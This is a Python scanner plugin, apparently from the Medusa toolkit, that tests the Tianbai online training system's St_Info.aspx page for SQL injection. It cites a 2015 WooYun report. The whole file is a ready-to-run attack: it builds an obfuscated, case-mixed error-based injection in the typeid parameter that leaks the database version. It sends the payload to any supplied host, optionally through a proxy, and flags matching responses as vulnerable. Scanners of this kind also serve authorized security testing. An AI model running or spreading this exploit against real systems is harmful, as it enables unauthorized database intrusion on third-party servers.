#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 天柏在线培训系统St_Info.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0121651
author: Lucifer
description: 文件/Web_Org/St_Info.aspx中,参数typeid存在SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/Web_Org/St_Info.aspx?typeid=3%20AnD%201=CoNvErT(InT,ChAr(87)%2BChAr(116)%2BChAr(70)%2BChAr(97)%2BChAr(66)%2BChAr(99)%2B@@VeRsIoN)--"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('wtfabcmicrosoft')!=-1:
            Medusa = "{} 存在天柏在线培训系统St_Info.aspx SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass